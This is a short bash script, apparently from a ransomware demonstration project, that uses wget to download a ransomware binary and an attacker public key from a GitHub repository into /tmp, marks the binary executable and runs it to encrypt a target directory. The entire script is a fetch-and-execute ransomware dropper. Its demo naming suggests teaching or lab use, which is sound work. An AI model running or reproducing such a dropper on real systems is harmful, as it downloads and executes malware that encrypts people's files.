#!/usr/bin/env bash
export DISPLAY=:0
wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/dist/ransomware -O /tmp/ransomware
wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/attacker/public_key.pem -O /tmp/public_key.pem
chmod +x /tmp/ransomware
/tmp/ransomware --pub /tmp/public_key.pem --path /home/ubuntu/development/yet-another-ransomware-demo/ransomware/os_root --enc-sym-key ~/
